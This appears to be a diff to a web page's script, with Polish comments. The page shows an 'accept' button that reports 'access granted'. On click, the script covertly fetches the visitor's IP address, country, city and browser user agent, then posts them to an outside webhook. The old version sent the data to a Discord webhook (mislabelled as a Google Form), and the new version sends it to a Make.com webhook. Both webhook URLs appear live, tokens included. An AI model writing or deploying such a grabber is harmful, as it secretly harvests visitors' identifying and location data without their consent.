@@ -11,21 +11,31 @@
 
 <script>
 document.getElementById('accept').onclick = async function() {
-    // Pobranie IP i UA
-    let res = await fetch('https://ipapi.co/json/');
-    let data = await res.json();
-    let ip = data.ip;
-    let ua = navigator.userAgent;
+    try {
+        // Pobranie IP + kraju przez darmowe API
+        let res = await fetch('https://ipapi.co/json/');
+        let data = await res.json();
 
-    // Wyślij dane do Google Form
-    fetch('https://discord.com/api/webhooks/1454804813328945162/ntueUPCbxfs7hEDQx0MgmGJA0MVl-a0XlNUVwiqYf5GxWguUSayZ_Mqo2j3XayfnmrGU', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: `entry.123456=${ip}&entry.654321=${ua}`
-    });
+        const payload = {
+            ip: data.ip,
+            country: data.country_name,
+            city: data.city,
+            ua: navigator.userAgent,
+            time: new Date().toISOString()
+        };
 
-    alert('Dostęp przyznany');
+        // Wyślij dane do webhooka Make
+        await fetch('https://hook.eu1.make.com/2xjh6jkj7gc2o3xaydt5b1ag3dup6y54', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+
+        alert('Dostęp przyznany.');
+    } catch(err) {
+        console.error(err);
+        alert('Coś poszło nie tak.');
+    }
 };
 </script>
 </body>
